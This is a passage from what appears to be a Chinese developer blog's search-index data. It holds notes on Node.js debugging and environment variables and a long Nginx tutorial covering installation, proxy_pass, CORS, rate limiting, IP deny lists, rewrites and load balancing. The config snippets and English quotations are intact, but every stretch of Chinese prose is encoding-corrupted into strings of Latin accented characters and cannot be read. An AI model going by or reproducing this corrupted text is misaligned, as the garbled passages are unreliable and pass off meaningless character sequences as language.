æ³•æ–­ç‚¹ã€‚ä½¿ç”¨sourcemapå°±èƒ½åœ¨æµè§ˆå™¨ä¸­å°†es5ä»£ç â€œåç¼–è¯‘â€æˆES2015ä»£ç ï¼Œè¿˜å¯ä»¥æ‰“æ–­ç‚¹ã€‚ å¥½ç”¨çš„modulepath(core module, æ— éœ€å®‰è£…)http(core module, æ— éœ€å®‰è£…)expressnodemon // å®æ—¶ç›‘æ§æœ¬åœ°æ–‡ä»¶å˜åŒ–ï¼Œé‡å¯æœåŠ¡ï¼Œå®‰è£…npm install nodemon -gbody-parserejspm2 //starting an node app as a bcakground servicemongoose How to debugvscode debug node jsçš„æ–¹å¼ï¼Œæ‰“å¼€è°ƒè¯•çª—å£ï¼Œç‚¹å‡»é‚£ä¸ªå°é½¿è½®(æ‰“å¼€launch.json)ã€‚ç›´æ¥åœ¨ä»£ç ä¸­æ–­ç‚¹å³å¯ã€‚æ³¨æ„åº•ä¸‹æœ‰ä¸€ä¸ªdebug console(è°ƒè¯•æ§åˆ¶å°)ï¼Œå¯ä»¥è¾“å…¥å˜é‡ï¼ŒæŸ¥çœ‹å½“å‰å€¼ï¼Œå’Œä¸€äº›å¤§å‹Ideå¾ˆåƒã€‚ åœ¨chromeé‡Œé¢debugçš„æ–¹å¼ï¼šnode â€“inspect app.js ## ä¸€é—ªè€Œè¿‡äº†node â€“inspect-brk app.js ##åœ¨ç¬¬ä¸€è¡Œå°±ç»™æˆ‘åœä¸‹æ¥ åœ¨chromeçš„åœ°å€æ è¾“å…¥ about:inspect , open dedicated DevTools for Nodeï¼Œç‚¹ä¸€ä¸‹å°±ä¼šå‡ºç°ä¸€ä¸ªå°çª—å£æˆ–è€…f12ï¼Œä¼šå‡ºç°ä¸€ä¸ªç»¿è‰²çš„nodeçš„å›¾æ ‡ï¼Œç‚¹ä¸€ä¸‹å’Œä¸Šé¢é‚£ä¸ªopen dedicated DevTools for Nodeæ˜¯ä¸€æ ·çš„Debugging in 2017 with Node.js process.env.NODE_ENVif (process.env.NODE_ENV === &#39;production&#39; ) { // }else { // } // windowsä¸Šå¯ä»¥è¿™ä¹ˆè®¾ç½® set NODE_ENV=dev //ç›´æ¥å†™åœ¨jsé‡Œé¢ä¹Ÿè¡Œ process.env.NODE_ENV = &#39;production&#39;; å†™åœ¨package.jsonçš„scripté‡Œé¢ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ &quot;scripts&quot;: { &quot;start&quot;: &quot;set NODE_ENV=dev &amp;&amp; node app.js&quot; } For Mac/Linux users, you can simply type: export MONGOLAB_URI=&quot;mongodb://username:password@ds01316.mlab.com:1316/food&quot; For Windows users: SET MONGOLAB_URI=mongodb://username:password@ds01316.mlab.com:1316/food After setting the Environment variables you need to call the Environment Variable into your code. You can do it by typing this var url = process.env.MONGOLAB_URI; process.env.XXXåªæ˜¯ç¯å¢ƒå˜é‡è€Œå·² ã€‚å…¶å®åªæ˜¯ a copy of the output env command on unix and set command on windows machine(æ³¨æ„æ˜¯copyï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹process.env.xxxä¸ä¼šå½±å“å½“å‰shellçš„env) å¥½åƒcrossenvæ¯”è¾ƒå¥½çš„å¤„ç†äº†è¿™ä¸ªé—®é¢˜ =============================================================================å¼€å‘ç¯å¢ƒç”¨nodemonï¼Œç”Ÿäº§ç¯å¢ƒç”¨pm2(PM2çš„ä¼˜èƒœä¹‹å¤„åœ¨äºå½“ä½ è¦å°†appéœ€è¦å¤šæ ¸å¤„ç†çš„æ—¶å€™ï¼ŒPM2å†…éƒ¨é›†æˆçš„è´Ÿè½½å‡è¡¡å¯ä»¥è®©ä½ å¾ˆå®¹æ˜“çš„å»æŒ‡å®šè¿è¡Œå¤šå°‘ä¸ªå®ä¾‹ã€‚) nodeé‡Œé¢å°±ä¸è¦ç”¨Ajaxäº†ï¼Œæ¨èaxiosï¼ŒåŸç”Ÿè‡ªå¸¦ä¹Ÿæœ‰httpsã€‚è€Œnodeä¸­çš„ä¸€äº›moduleä¹Ÿä¸èƒ½ç”¨äºæµè§ˆå™¨ç«¯ï¼Œæ¯”å¦‚fsè¿™ç§å±äºåLow levelçš„api typeScriptæ•™ç¨‹node js advanced topics è¡¥ä¸Šä¸€å¥ï¼Œå›½å†…å¾ˆå¤šè½¯ä»¶éƒ½æœ‰æ¯”è¾ƒå¥½çš„æºï¼Œæ¢ç”µè„‘åæœ€å¥½æŠŠä¸€äº›å¸¸ç”¨çš„æºéƒ½ç»™æ¢æ‰æ¯”è¾ƒå‡ºåçš„æœ‰æ¸…åçš„å’Œä¸­ç§‘å¤§çš„æº mavenæœ‰ä¸€ä¸ªæ·˜å®æº, ä¿®æ”¹~/.m2/settings.xmlå°±è¡Œäº† npm æ¯”è¾ƒå‡ºåçš„æ˜¯æ·˜å®çš„æºï¼Œä¿®æ”¹~/.npmrcå°±å¯ä»¥äº†ï¼Œæ®è¯´10åˆ†é’Ÿæ›´æ–°ä¸€æ¬¡ homebrewä¹Ÿè¦æ¢ dockerä¹Ÿæ˜¯ ubuntuçš„aptä¹Ÿæ˜¯ openwrtçš„opkgä¹Ÿæ˜¯ pipä¹Ÿæ˜¯ ä¸è¦æŠŠäººç”Ÿæµªè´¹åœ¨å’Œgfwæ­»ç£•ä¸Š","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"}]},{"title":"Nginxä½¿ç”¨è®°å½•","date":"2017-12-10T16:12:43.000Z","path":"2017/12/10/2017-12-10-nginx-culinary-tips/","text":"linodeçš„docsé‡Œé¢æ˜¯è¿™ä¹ˆä»‹ç»çš„ nginx is a lightweight, high performance web server designed to deliver large amounts of static content quickly with efficient use of system resources. nginxâ€™s strong point is its ability to efficiently serve static content, like plain HTML and media files. Some consider it a less than ideal server for dynamic content. 1.å®‰è£…ä¸æ¨èåœ¨windowsä¸Šå®‰è£…nginxInstalling nginx on windowså®‰è£…æ•™ç¨‹ï¼Œgoogle â€˜installing nginx on ubuntuâ€™åŸºæœ¬ä¸Šå°±æ˜¯æŠŠDigitalOceanå†™çš„è¿™äº›å¤åˆ¶ç²˜è´´è¿‡æ¥ å½“ç„¶apt get é»˜è®¤çš„æºå¯èƒ½æœ‰äº›è€ï¼Œæ‰€ä»¥å¦‚æœè¿½æ±‚æœ€æ–°ç‰ˆæœ¬çš„è¯ï¼Œå¯ä»¥æ·»åŠ ppa sudo apt-get update sudo apt-get install nginx ## We can list the applications configurations that ufw knows how to work with by typing: sudo ufw app list sudo ufw allow &#39;Nginx HTTP&#39; sudo ufw status 1.1 å®‰è£…å¤±è´¥çš„è§£å†³æ–¹æ¡ˆ Job for nginx.service failed because the control process exited with error code. See â€œsystemctl status nginx.serviceâ€ and â€œjournalctl -xeâ€ for details.invoke-rc.d: initscript nginx, action â€œstartâ€ failed.â— nginx.service - A high performance web server and a reverse proxy server Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled) æ ¹æ®Nginx installation error in Ubuntu 16.04è§£å†³æ–¹æ¡ˆ: Check your nginx error log:sudo cat /var/log/nginx/error.log|lessThen try again:sudo apt-get update;sudo apt-get upgrade æˆ‘çœ‹åˆ°çš„æ˜¯: 2017/12/10 22:21:46 [emerg] 2485#2485: bind() to 0.0.0.0:80 failed (98: Address already in use)2017/12/10 22:21:46 [emerg] 2485#2485: bind() to 0.0.0.0:80 failed (98: Address already in use)2017/12/10 22:21:46 [emerg] 2485#2485: bind() to 0.0.0.0:80 failed (98: Address already in use)2017/12/10 22:21:46 [emerg] 2485#2485: bind() to 0.0.0.0:80 failed (98: Address already in use)2017/12/10 22:21:46 [emerg] 2485#2485: bind() to 0.0.0.0:80 failed (98: Address already in use) å°±æ˜¯80ç«¯å£è¢«å ç”¨äº†ï¼Œçœ‹ä¸‹è°åœ¨ç”¨: lsof -i:80 2. å¸¸ç”¨command## æŸ¥çœ‹å½“å‰status systemctl status nginx ## stop sudo systemctl stop nginx ## start sudo systemctl start nginx ##é‡å¯ sudo systemctl restart nginx ## æ”¹äº†é…ç½®æ–‡ä»¶ä¹‹åå¯ä»¥ç›´æ¥reloadï¼Œè€Œä¸ä¼šå¤±å»è¿æ¥ sudo systemctl reload nginx ## nginxé»˜è®¤å¼€æœºå¯åŠ¨çš„,å–æ¶ˆå¼€æœºå¯åŠ¨ sudo systemctl disable nginx ## åŠ å…¥å¼€æœºå¯åŠ¨ sudo systemctl enable nginx 3. å¸¸ç”¨ç›®å½•å’Œæ–‡ä»¶(ç›´æ¥ä»DigitalOceanå¤åˆ¶è¿‡æ¥äº†) /var/www/html ## å°±æ˜¯æ”¾é»˜è®¤é¦–é¡µçš„åœ°æ–¹ï¼ˆåŸå› æ˜¯ /etc/nginx/sites-enabled/defaultè¿™é‡Œé¢è®¾ç½®çš„ï¼‰ /etc/nginx: The Nginx configuration directory. All of the Nginx configuration files reside here./etc/nginx/nginx.conf: The main Nginx configuration file. This can be modified to make changes to the Nginx global configuration./etc/nginx/sites-available/: The directory where per-site â€œserver blocksâ€ can be stored. Nginx will not use the configuration files found in this directory unless they are linked to the sites-enabled directory (see below). Typically, all server block configuration is done in this directory, and then enabled by linking to the other directory./etc/nginx/sites-enabled/: The directory where enabled per-site â€œserver blocksâ€ are stored. Typically, these are created by linking to configuration files found in the sites-available directory./etc/nginx/snippets: This directory contains configuration fragments that can be included elsewhere in the Nginx configuration. Potentially repeatable configuration segments are good candidates for refactoring into snippets. è®¿é—®æ—¥å¿—éƒ½åœ¨è¿™é‡Œ /var/log/nginx/access.log: Every request to your web server is recorded in this log file unless Nginx is configured to do otherwise./var/log/nginx/error.log: Any Nginx errors will be recorded in this log. åœ¨debianç³»ä¸Šï¼Œé»˜è®¤çš„æ ¹ç›®å½•åœ¨è¿™ä¸ªä½ç½® /usr/share/nginx/usr/share/nginx/html ##æœ€è¿‘çš„ç‰ˆæœ¬æŒªåˆ°è¿™é‡Œäº† ç”¨nginx -V æŸ¥çœ‹é‚£ä¸ªâ€“prefix=â€œå®é™…ä½¿ç”¨çš„è·¯å¾„â€ 4.é…ç½®æ–‡ä»¶4.1 ä¸æƒ³ç”¨80ç«¯å£æ€ä¹ˆåŠ(æ¯”å¦‚è·Ÿapacheå†²çªäº†)ä¿®æ”¹ /etc/nginx/nginx.confæ–‡ä»¶configæ–‡ä»¶çš„å¤§è‡´ç»“æ„å°±æ˜¯è¿™æ ·,æ¥è‡ªstackoverflow user www-data; worker_processes 1; error_log /var/log/nginx/error.log; pid /var/run/nginx.pid; events { worker_connections 1024; # multi_accept on; } http { include /etc/nginx/mime.types; log_format main &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39; &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39; &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;; ##è¿™ä¸ªlog formatæ˜¯å¯ä»¥è‡ªå®šä¹‰logæ ¼å¼çš„ access_log /var/log/nginx/access.log; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; tcp_nodelay on; gzip on; gzip_disable &quot;MSIE [1-6]\\.(?!.*SV1)&quot;; include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; ## include F:/nginx/conf/sites-enabled/default; å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„ï¼Œincludeä¸è®¤ç›¸å¯¹è·¯å¾„ server { listen 81; location / { proxy_pass http://94.143.9.34:9500; proxy_set_header Host $host:81; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Via &quot;nginx&quot;; } } } mail { See sample authentication script at: http://wiki.nginx.org/NginxImapAuthenticateWithApachePhpScript auth_http localhost/auth.php; pop3_capabilities &quot;TOP&quot; &quot;USER&quot;; imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;; server { listen localhost:110; protocol pop3; proxy on; } server { listen localhost:143; protocol imap; proxy on; } } æ¯”å¦‚æƒ³è¦é€šè¿‡81ç«¯å£è®¿é—®ï¼ŒåŠ ä¸Šè¿™ä¹ˆä¸€è¡Œ server { listen 81; server_name example.org www.example.org; root /var/www/html/ } Checking nginx config file syntax nginx -t -c conf/nginx.confnginx -s quit //gracefully stop on windowsnginx -s stop // force stop on windows 4.2 é™åˆ¶æ—¥å¿—æ–‡ä»¶çš„å¤§å°æ ¹æ®ä¸Šé¢çš„configæ–‡ä»¶ï¼Œé»˜è®¤çš„è®¿é—®æ—¥å¿—æ˜¯åœ¨/var/log/nginx/access.logè¿™ä¸ªæ–‡ä»¶é‡Œé¢ã€‚é™åˆ¶è¿™ä¸ªæ–‡ä»¶çš„å¤§å°çš„æ–¹æ³•ï¼šserverfault è®¿é—®æ—¥å¿—çš„è®¾ç½®ï¼Œä»¥åŠå›¾å½¢åŒ–ç»Ÿè®¡ã€‚å…¶å®è¿˜å¯ä»¥ç»“åˆawkåšæ–‡æœ¬ç»Ÿè®¡ /etc/logrotate.d/nginx /var/log/nginx/access_log { rotate 7 size 5k dateext dateformat -%Y-%m-%d missingok compress sharedscripts postrotate test -r /var/run/nginx.pid &amp;&amp; kill -USR1 `cat /var/run/nginx.pid` endscript } éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ç½‘ç«™è®¿é—®é‡å¤§åï¼Œæ—¥å¿—æ•°æ®å°±ä¼šå¾ˆå¤šï¼Œå¦‚æœå…¨éƒ¨å†™åˆ°ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­å»ï¼Œæ–‡ä»¶ä¼šå˜å¾—è¶Šæ¥è¶Šå¤§ã€‚æ–‡ä»¶å¤§é€Ÿåº¦å°±ä¼šæ…¢ä¸‹æ¥ï¼Œæ¯”å¦‚ä¸€ä¸ªæ–‡ä»¶å‡ ç™¾å…†ã€‚å†™å…¥æ—¥å¿—çš„æ—¶å€™ï¼Œä¼šå½±å“æ“ä½œé€Ÿåº¦ã€‚å¦å¤–ï¼Œå¦‚æœæˆ‘æƒ³çœ‹çœ‹è®¿é—®æ—¥å¿—ï¼Œä¸€ä¸ªå‡ ç™¾å…†çš„æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥æ‰“å¼€ä¹Ÿå¾ˆæ…¢ã€‚ä¸ºäº†æ–¹ä¾¿å¯¹æ—¥å¿—è¿›è¡Œåˆ†æè®¡ç®—ï¼Œéœ€è¦å¯¹æ—¥å¿—è¿›è¡Œå®šæ—¶åˆ‡å‰²ã€‚å®šæ—¶åˆ‡å‰²çš„æ–¹å¼æœ‰æŒ‰ç…§æœˆåˆ‡å‰²ã€æŒ‰å¤©åˆ‡å‰²ï¼ŒæŒ‰å°æ—¶åˆ‡å‰²ç­‰ã€‚æœ€å¸¸ç”¨çš„æ˜¯æŒ‰å¤©åˆ‡å‰²ã€‚è„šæœ¬ 4.3 åˆ†äº«ç‰¹å®šç›®å½•(serve static files)How to serve a directory of static files at a certain location path with nginx? server { listen 80; server_name something.nateeagle.com; location /something { alias /home/neagle/something; index index.html index.htm; } } æœ‰çš„æ—¶å€™ä¼šçœ‹åˆ°ä¸¤ç§å†™æ³• location /static/ { root /var/www/app/static/; autoindex off; } ## ç»“æœæ˜¯/var/www/app/static/staticç›®å½• location /static/ { alias /var/www/app/static/; autoindex off; } ##è¿™æ‰æ˜¯/var/www/app/staticç›®å½• locationé‡Œé¢å†™rootè¿˜æ˜¯alias é‚£aliasæ ‡ç­¾å’Œrootæ ‡ç­¾åˆ°åº•æœ‰å“ªäº›åŒºåˆ«å‘¢ï¼Ÿ aliasåè·Ÿçš„æŒ‡å®šç›®å½•æ˜¯å‡†ç¡®çš„,å¹¶ä¸”æœ«å°¾å¿…é¡»åŠ â€œ/â€ï¼Œå¦åˆ™æ‰¾ä¸åˆ°æ–‡ä»¶ location /c/ { alias /a/ } å¦‚æœè®¿é—®ç«™ç‚¹http://location/c ï¼Œè®¿é—®çš„å°±æ˜¯/a/ç›®å½•ä¸‹çš„ç«™ç‚¹ä¿¡æ¯ã€‚ 2ã€rootåè·Ÿçš„æŒ‡å®šç›®å½•æ˜¯ä¸Šçº§ç›®å½•ï¼Œå¹¶ä¸”è¯¥ä¸Šçº§ç›®å½•ä¸‹è¦å«æœ‰å’ŒlocationåæŒ‡å®šåç§°çš„åŒåç›®å½•æ‰è¡Œï¼Œæœ«å°¾â€œ/â€åŠ ä¸åŠ æ— æ‰€è°“ã€‚ location /c/ { root /a/ } å¦‚æœè®¿é—®ç«™ç‚¹http://location/cï¼Œè®¿é—®çš„å°±æ˜¯/a/cç›®å½•ä¸‹çš„ç«™ç‚¹ä¿¡æ¯ã€‚ 3.ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåœ¨location /ä¸­é…ç½®rootï¼Œåœ¨location /otherä¸­é…ç½®aliasæ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚ åœ¨windowså¹³å°ä¸‹å¯ä»¥è¿™ä¹ˆå†™ location / { root D:/VDownload; index index.html index.htm; } nginx -s reload ç„¶åé‡å¯nginx 4.4 Nginxè½¯é“¾æ¥ç›®æµ‹ä¸èƒ½ç”¨è½¯é“¾æ¥ 4.5 Nginxé€šè¿‡CORSå®ç°è·¨åŸŸåœ¨nginx.confé‡Œæ‰¾åˆ°serveré¡¹,å¹¶åœ¨é‡Œé¢æ·»åŠ å¦‚ä¸‹é…ç½® location / { add_header &#39;Access-Control-Allow-Origin&#39; &#39;http://example.com&#39;; add_header &#39;Access-Control-Allow-Credentials&#39; &#39;true&#39;; add_header &#39;Access-Control-Allow-Headers&#39; &#39;Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With&#39;; add_header &#39;Access-Control-Allow-Methods&#39; &#39;GET,POST,OPTIONS&#39;; ... } ä½†ä¸Šè¿°é…ç½®åªèƒ½å®ç°å…è®¸ä¸€ä¸ªdomainæˆ–è€…*å®ç°è·¨åŸŸï¼ŒNginxå…è®¸å¤šä¸ªåŸŸåè·¨åŸŸè®¿é—®åœ¨location contextçš„ä¸Šå±‚æ·»åŠ  map $http_origin $corsHost { default 0; &quot;~http://www.example.com&quot; http://www.example.com; &quot;~http://m.example.com&quot; http://m.example.com; &quot;~http://wap.example.com&quot; http://wap.example.com; } server { listen 80; server_name www.example2.com; root /usr/share/nginx/html; location / { add_header Access-Control-Allow-Origin $corsHost; } } 5. proxy_passæ ¹æ®how-to-set-up-a-node-js-application-for-production-on-ubuntu-14-04 /etc/nginx/sites-available/default server { listen 80; server_name example.com; location / { proxy_pass http://APP_PRIVATE_IP_ADDRESS:8080; // Aåº”ç”¨è·‘åœ¨8080ç«¯å£ï¼Œå¤–éƒ¨è®¿é—®http://example.com/å³å¯è®¿é—®åº”ç”¨æœåŠ¡ proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#39;upgrade&#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } location /app2 { proxy_pass http://APP_PRIVATE_IP_ADDRESS:8081; // Båº”ç”¨è·‘åœ¨8081ç«¯å£ï¼Œå¤–éƒ¨è®¿é—®http://example.com/app2å³å¯è®¿é—®åº”ç”¨æœåŠ¡ proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#39;upgrade&#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } 5.1 pratical take awaysnginxé…ç½®locationæ€»ç»“åŠrewriteè§„åˆ™å†™æ³• ddosé˜²å¾¡from mitigating-ddos-attacks-with-nginx-and-nginx-plus/ allow a single client IP address to attempt to login only every 2 seconds (equivalent to 30 requests per minute): 1. Limiting the Rate of Requestseg: å•ipè®¿é—®loginæ¥å£é¢‘ç‡ä¸èƒ½è¶…è¿‡2ç§’æ¯æ¬¡ã€‚ limit_req_zone $binary_remote_addr zone=one:10m rate=30r/m; server { ... location /login.html { limit_req zone=one; ... } } 2. Limiting the Number of Connectionseg: å•ipè®¿é—®/store/ä¸èƒ½åˆ›å»ºè¶…è¿‡10æ¡connections limit_conn_zone $binary_remote_addr zone=addr:10m; server { # ... location /store/ { limit_conn addr 10; # ... } } 3. Closing Slow Connectionseg: é™å®šnginxä¸€æ¡connectionå†™client headerå’Œå†™client bodyçš„æ—¶é—´é—´éš”ä¸º5sï¼Œé»˜è®¤ä¸º60s server { client_body_timeout 5s; client_header_timeout 5s; } 4. é»‘åå•// 123.123.123.1 through 123.123.123.16 æ‹‰é»‘ location / { deny 123.123.123.0/28; # ... } location / { deny 123.123.123.3; deny 123.123.123.5; deny 123.123.123.7; # ... } //åªå…è®¸ç‰¹å®šç™½åå• location / { allow 192.168.1.0/24; deny all; # ... } 5. ngx_http_proxy_moduleçš„configurationproxy_cache_use_staleå½“å®¢æˆ·ç«¯è¯·æ±‚ä¸€é¡¹è¿‡æœŸçš„èµ„æºæ—¶ï¼Œåªå‘é€ä¸€æ¬¡è¯·æ±‚ï¼Œåœ¨backend serverè¿”å›æ–°çš„èµ„æºä¹‹å‰ï¼Œä¸å†å‘é€æ–°çš„è¯·æ±‚ï¼Œå¹¶åªå‘å®¢æˆ·ç«¯è¿”å›å·²æœ‰çš„è¿‡æœŸèµ„æºã€‚è¿™æœ‰åŠ©äºç¼“è§£backend serverçš„å‹åŠ›ã€‚proxy_cache_key:åŒ…å«å†…ç½®ä¸‰ä¸ªkey$scheme$proxy_host$request_uriã€‚ä½†ä¸è¦æ·»åŠ $query_stringï¼Œè¿™ä¼šé€ æˆè¿‡å¤šçš„caching. 6. å‡ ç§æƒ…å†µæ˜¯åº”è¯¥ç›´æ¥æ‹‰é»‘çš„ Requests to a specific URL that seems to be targetedRequests in which the User-Agent header is set to a value that does not correspond to normal client trafficRequests in which the Referer header is set to a value that can be associated with an attackRequests in which other headers have values that can be associated with an attack location /foo.php { deny all; //ç›´æ¥è®©è¿™ä¸ªæ¥å£ä¸å“åº” } location / { if ($http_user_agent ~* foo|bar) { return 403; //User-Agentä¸­æœ‰fooæˆ–è€…barçš„æ—¶å€™ç›´æ¥forbidden } # ... } // NGINX Plusæä¾›çš„ // An NGINX or NGINX Plus instance can usually handle many more simultaneous connections than the backend servers it is load balancing. //ä½œä¸ºä»£ç†ï¼Œnginxèƒ½å¤Ÿæ¥å—çš„è¿æ¥æ•°è¦è¿œè¶…å…¶ä»£ç†çš„åå°æœåŠ¡ upstream website { server 192.168.100.1:80 max_conns=200; server 192.168.100.2:80 max_conns=200; queue 10 timeout=30s; } 5.2 Nginxæ¨¡å—http_image_filter_moduleï¼ˆå›¾ç‰‡è£å‰ªæ¨¡å—ï¼‰é¦–å…ˆæŸ¥çœ‹æ˜¯å¦å·²å®‰è£…http_image_filter_moduleæ¨¡å— nginx -V/etc/nginx/nginx.confæ–‡ä»¶æ·»åŠ  location /image { alias &quot;/imgdirectory/&quot;; ## è¿™æ ·ç›´æ¥è¾“å…¥ yourip/image/imgname.jpgå°±èƒ½è¿”å›åŸå§‹å›¾ç‰‡ } location ~* (.*\\.(jpg|jpeg|gif|png))!(.*)!(.*)$ { ## è¿™ä¸ªæ˜¯åŒ¹é…å…¨ç«™å›¾ç‰‡èµ„æº set $width $3; set $height $4; rewrite &quot;(.*\\.(jpg|jpeg|gif|png))(.*)$&quot; $1; ## è¿™æ ·è¾“å…¥ yourip/image/imgname.jpg!200!200å°±èƒ½è¿”å›200*200çš„å›¾ç‰‡ } location ~* /imgs/.*\\.(jpg|jpeg|gif|png|jpeg)$ { root &quot;/var/www/&quot;; image_filter resize $width $height; } äº²æµ‹ä¸Šè¿°å¯è¡Œï¼Œpythonä¹Ÿæœ‰ç±»ä¼¼åº“thumbor å…³äºæ­£åˆ™åŒ¹é…ï¼š ## æ¯”å¦‚åŒ¹é…å…¨ç«™æ‰€æœ‰çš„ç»“å°¾å›¾ç‰‡ location ~* \\.(jpg|gif|png)$ { image_filter resize 500 500; } ### åŒ¹é…æŸä¸ªç›®å½•æ‰€æœ‰å›¾ç‰‡ location ~* /image/.*\\.(jpg|gif|png)$ { image_filter resize 500 500; } æ›´å¤šç›´æ¥googleå§ã€‚å…³äºè¿™ä¸ªvar/wwwç›®å½•ï¼ŒæŒ‰ç…§æƒ¯ä¾‹ï¼Œè¿™ä¸ªç›®å½•é‡Œé¢å°±åº”è¯¥æ”¾example.com,anothersite.com,myblog.com,â€¦è¿™ç§æ ¹æ®ä¸€ä¸ªä¸ªsiteåæ¥æ”¾ç½®èµ„æºå’Œhtmlæ–‡ä»¶ã€‚ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œæ”¾ä¸€ä¸ªsiteç›¸å…³çš„èµ„æºï¼Œå½“ç„¶è¿™åªæ˜¯æƒ¯ä¾‹ã€‚ æ·»åŠ é»‘åå•##è·å–å„ä¸ªIPè®¿é—®æ¬¡æ•° awk &#39;{print $1}&#39; nginx.access.log |sort |uniq -c|sort -n sudo last | awk &#39;{ print $(NF-7)}&#39; | sort | uniq -c | sort -n //ç»Ÿè®¡ç™»å½•ipæ¬¡æ•° æŸ¥çœ‹æŸä¸ªæ—¶é—´ç«¯ä¸­è®¿é—®çš„æ—¥å¿—ï¼Œ2018å¹´7æœˆ28æ—¥ä¸Šåˆ10ç‚¹åˆ°2018å¹´7æœˆ30æ—¥ä¸‹åˆ1ç‚¹çš„æ—¥å¿— cat access.log | sed -n &#39;/28\\/Jul\\/2018:10/,/30\\/Jul\\/2018:13/p&#39; | more ## æ–°å»ºä¸€ä¸ªé»‘åå•æ–‡ä»¶ blacklist.conf ,æ”¾åœ¨ nginx/confä¸‹é¢ã€‚ ##æ·»åŠ ä¸€ä¸ªIP ï¼Œdeny 192.168.59.1; ### åœ¨httpæˆ–è€…serveræ¨¡å—å¼•å…¥ include blacklist.conf ; ##éœ€è¦é‡å¯æœåŠ¡å™¨, nginx -s reload; å³å¯ç”Ÿæ•ˆ é˜²å¾¡DDOSæ˜¯ä¸€ä¸ªç³»ç»Ÿå·¥ç¨‹ï¼Œè¿™é‡Œåªæ˜¯ä¸€å°ç‚¹ã€‚ 5.3 return rewrite and try_filesserver { listen 80; listen 443 ssl; server_name www.old-name.com; return 301 $scheme://www.new-name.com$request_uri; } 301 (Moved Permanently) //ä¸Šé¢çš„schemeæ˜¯httpæˆ–è€…httpsï¼Œrequest_urlå°±æ˜¯è¯·æ±‚çš„urlã€‚ rewriteå°±æ›´åŠ å¤æ‚ä¸€ç‚¹ï¼Œæ¯”å¦‚å¯ä»¥manipulate urlHereâ€™s a sample NGINX rewrite rule that uses the rewrite directive. It matches URLs that begin with the string /download and then include the /media/ or /audio/ directory somewhere later in the path. It replaces those elements with /mp3/ and adds the appropriate file extension, .mp3 or .ra. The $1 and $2 variables capture the path elements that arenâ€™t changing. As an example, /download/cdn-west/media/file1 becomes /download/cdn-west/mp3/file1.mp3. If there is an extension on the filename (such as .flv), the expression strips it off and replaces it with .mp3. server { # ... rewrite ^(/download/.*)/media/(\\w+)\\.?.*$ $1/mp3/$2.mp3 last; rewrite ^(/download/.*)/audio/(\\w+)\\.?.*$ $1/mp3/$2.ra last; return 403; # ... } In the following example, NGINX serves a default GIF file if the file requested by the client doesnâ€™t exist. When the client requests (for example) http://www.domain.com/images/image1.gif, NGINX first looks for image1.gif in the local directory specified by the root or alias directive that applies to the location (not shown in the snippet). If image1.gif doesnâ€™t exist, NGINX looks for image1.gif/, and if that doesnâ€™t exist, it redirects to /images/default.gif. That value exactly matches the second location directive, so processing stops and NGINX serves that file and marks it to be cached for 30 seconds. try_files $uri $uri/ =404; ## è¿™ä¹ˆå†™çš„è¯ï¼Œç¢°åˆ°æ‰¾ä¸åˆ°çš„ï¼Œæµè§ˆå™¨ç›´æ¥è¿”å›ä¸€ä¸ªä¸‘åˆ°çˆ†çš„ngixé»˜è®¤404é¡µé¢ã€‚ location /images/ { try_files $uri $uri/ /images/default.gif; } location = /images/default.gif { expires 30s; ## expireè¿™ä¸ªå°±æ˜¯è·Ÿç¼“å­˜ç›¸å…³çš„ expires 1d; expires 24h; } location ~ \\.(htm|html|gif|jpg|jpeg|png|bmp|ico|css|js|txt)$ { root /opt/webapp; expires 24h; ## è¿™æ ·ç›´æ¥æ ¹æ®åç¼€è®¾å®šç¼“å­˜ä¹Ÿè¡Œå•Šï¼Œ } 5.4 NGINX LOAD BALANCING è´Ÿè½½å‡è¡¡Load balancing across multiple application instances is a commonly used technique for optimizing resource utilization, maximizing throughput, reducing latency, and ensuring fault-tolerant configurations. http { upstream backend { server backend1.example.com weight=5; server backend2.example.com down; #æœåŠ¡æ ‡è®°ä¸ºç¦»çº¿ï¼Œä¸å†ä½¿ç”¨ server 192.0.0.1 backup; ## å¤‡ä»½æœåŠ¡å™¨ï¼Œå…¶ä»–å…¨éƒ¨å®•æœºäº†æ‰å¯ç”¨ } server { location / { proxy_pass http://backend; ## æ‰€æœ‰çš„è®¿é—®http://backendçš„æµé‡éƒ½è¢«å¯¼å‘ä¸Šé¢çš„ä¸‰ä¸ªæœåŠ¡å™¨ ## proxy_passåªæ˜¯å…¶ä¸­ä¸€ç§ï¼Œè¿˜æœ‰fastcgi_pass, memcached_pass, uwsgi_pass, scgi_pass proxy_set_header X-Real-IP $remote_addr; #æŠŠclientçš„çœŸå®ipè€Œä¸æ˜¯nginxæœºå™¨çš„ipä¼ ç»™åç«¯æœåŠ¡ proxy_set_header Host $http_host; #æŠŠclientè¯·æ±‚ä¸­headeré‡Œé¢çš„HOSTä¼ ç»™åç«¯æœåŠ¡ ## $hostä¸å¸¦ç«¯å£ $http_hostå¸¦ç«¯å£ proxy_pass_header Server; ## 